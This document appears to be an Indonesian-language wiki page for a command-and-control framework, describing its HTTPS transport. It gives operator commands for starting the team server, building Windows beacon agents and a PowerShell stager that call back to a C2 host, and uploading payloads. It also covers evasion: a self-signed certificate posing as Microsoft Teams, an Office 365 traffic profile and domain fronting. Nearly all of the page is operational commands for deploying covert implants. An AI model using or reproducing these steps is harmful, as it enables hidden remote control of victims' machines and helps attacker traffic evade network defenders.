# Transport: HTTPS

Agent beacons over TLS-encrypted HTTP. Direkomendasikan untuk semua engagement — traffic terlihat seperti HTTPS web normal, dan ada lapisan TLS di atas application-level AES-GCM encryption.

---

## Kapan Dipakai

- **Default untuk semua engagement nyata** — traffic terenkripsi dua lapis
- Ketika target environment hanya allow outbound port 443
- Ketika kamu butuh cert pinning untuk memastikan agent hanya bicara ke server kamu
- Kombinasi dengan domain fronting (lihat [wiki/19-opsec-guide.md](19-opsec-guide.md))

---

## Arsitektur

```
[Agent] --HTTPS POST/GET (TLS)--> [Team Server :8443]
                                   └── auto-redirect :8080 → :8443
```

Double encryption:
1. **TLS** — transport layer, dibuka di server
2. **AES-256-GCM + ECDH** — application layer, key di-negotiate saat checkin

---

## Step 1 — Siapkan TLS Cert

### Opsi A: Auto-generate (self-signed) — cepat untuk lab

Server otomatis generate self-signed cert saat `--tls` dinyalakan. Agent harus di-build dengan `--insecure-tls`.

### Opsi B: Cert sendiri (production)

```bash
# Generate self-signed cert manual (pakai untuk control output)
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt \
  -days 365 -nodes \
  -subj "/C=US/O=Microsoft Corporation/CN=teams.microsoft.com"

# Ambil SHA-256 fingerprint untuk cert pinning
openssl x509 -in server.crt -noout -fingerprint -sha256 \
  | sed 's/://g' | awk -F= '{print tolower($2)}'
```

Simpan output fingerprint — dipakai di `--cert-pin` saat generate agent.

### Opsi C: Let's Encrypt (domain publik)

```bash
certbot certonly --standalone -d c2.example.com
# Cert di: /etc/letsencrypt/live/c2.example.com/fullchain.pem
# Key  di: /etc/letsencrypt/live/c2.example.com/privkey.pem
```

---

## Step 2 — Start Server (HTTPS)

```bash
# Auto-generated self-signed cert
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --tls \
  --tls-port 8443 \
  -port 8080

# Cert sendiri
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --tls \
  --tls-cert /path/to/server.crt \
  --tls-key /path/to/server.key \
  --tls-port 8443 \
  -port 8080 \
  -profile office365
```

| Flag | Env | Default | Keterangan |
|------|-----|---------|-----------|
| `--tls` | `$TLS_ENABLED` | `false` | Aktifkan HTTPS listener |
| `--tls-port` | `$TLS_PORT` | `8443` | Port HTTPS |
| `--tls-cert` | `$TLS_CERT` | auto-generate | Path ke cert file (.crt/.pem) |
| `--tls-key` | `$TLS_KEY` | auto-generate | Path ke private key |
| `-port` | `$PORT` | `8080` | Port HTTP (redirect ke HTTPS) |

**Expected log:**
```
  [✓]  ready  ·  HTTPS on 0.0.0.0:8443  (cert: auto-generated)
       HTTP  :8080 → redirect to HTTPS
```

---

## Step 3 — Generate Agent (HTTPS)

```bash
# Self-signed cert (skip TLS verify)
go run ./cmd/generate/ stageless \
  --c2 https://192.168.1.10:8443 \
  --key MySecretKey32Chars00000000000000 \
  --insecure-tls \
  --output bin/agent_https.exe

# Dengan cert pinning (recommended — agent tolak cert lain)
go run ./cmd/generate/ stageless \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --cert-pin a1b2c3d4e5f6...  \
  --output bin/agent_https_pinned.exe

# Dengan domain fronting
go run ./cmd/generate/ stageless \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --insecure-tls \
  --c2-profile office365 \
  --output bin/agent_o365.exe
```

| Flag | Keterangan |
|------|-----------|
| `--insecure-tls` | Skip verifikasi CA chain (untuk self-signed cert) |
| `--cert-pin <sha256>` | Pin cert fingerprint — tolak semua cert lain |
| `--c2-profile` | Malleable HTTP profile (lihat tabel di wiki/22) |

> **Catatan**: `--insecure-tls` dan `--cert-pin` saling eksklusif secara logika. Pakai `--cert-pin` untuk production (lebih aman), `--insecure-tls` untuk lab.

---

## Step 4 — Verify Checkin

Sama seperti HTTP. Log server:
```
[+] Agent checkin: <agent-id>  192.168.1.50  DESKTOP-ABC  user  windows/amd64
```

---

## Step 5 — Verify Encryption

### Wireshark — konfirmasi TLS handshake

Filter:
```
tcp.port == 8443
```

Yang harus terlihat:
1. `Client Hello` → `Server Hello` → `Certificate` → `Finished` (TLS handshake)
2. `Application Data` — isi terenkripsi, tidak bisa dibaca

Untuk konfirmasi cert:
```
tls.handshake.type == 11
```
Klik packet Certificate → expand `TLS > Handshake Protocol > Certificate > Certificate` → lihat Subject dan validity.

### Verifikasi cert pinning

```bash
# Cek fingerprint cert yang sedang dipakai server
echo | openssl s_client -connect 192.168.1.10:8443 2>/dev/null \
  | openssl x509 -noout -fingerprint -sha256 \
  | sed 's/://g' | awk -F= '{print tolower($2)}'
```

Output harus sama dengan nilai `--cert-pin` yang di-bake ke agent.

### Verifikasi double-encryption

Jika kamu decrypt TLS session (dengan server private key di Wireshark SSLKEYLOGFILE), inner HTTP body harus tetap acak:
```json
{"agent_id":"...","encrypted_payload":"<base64-tidak-terbaca>"}
```

---

## Step 6 — Generate Stager HTTPS

```bash
# Stager download via HTTPS
go run ./cmd/generate/ stager \
  --c2 https://c2.example.com \
  --token <upload-token> \
  --key MySecretKey32Chars00000000000000 \
  --format ps1 \
  --output stager_https.ps1
```

Upload payload dulu:
```bash
go run ./cmd/generate/ upload bin/agent_https.exe \
  --server https://c2.example.com \
  --api-key <api-key> \
  --insecure
```

---

## Troubleshooting

| Symptom | Penyebab | Solusi |
|---------|----------|--------|
| `x509: certificate signed by unknown authority` | Pakai self-signed tanpa `--insecure-tls` | Rebuild agent dengan `--insecure-tls` |
| `x509: certificate is valid for X, not Y` | CN/SAN cert tidak match hostname di `--c2` | Gunakan IP di `--c2` atau rebuild cert dengan SAN yang benar |
| Cert pin mismatch | Server cert berubah (renewal) atau agent salah fingerprint | Ambil fingerprint baru, rebuild agent |
| `TLS handshake error` di server log | Agent pakai TLS versi lama atau cipher suite tidak support | Cek Go version server vs. agent |
| HTTP redirect loop | `-port` dan `--tls-port` sama | Gunakan port berbeda (8080 + 8443) |
| Port 443 permission denied | Butuh root untuk bind port < 1024 | Pakai `setcap cap_net_bind_service=+ep` atau DNAT iptables: `iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443` |
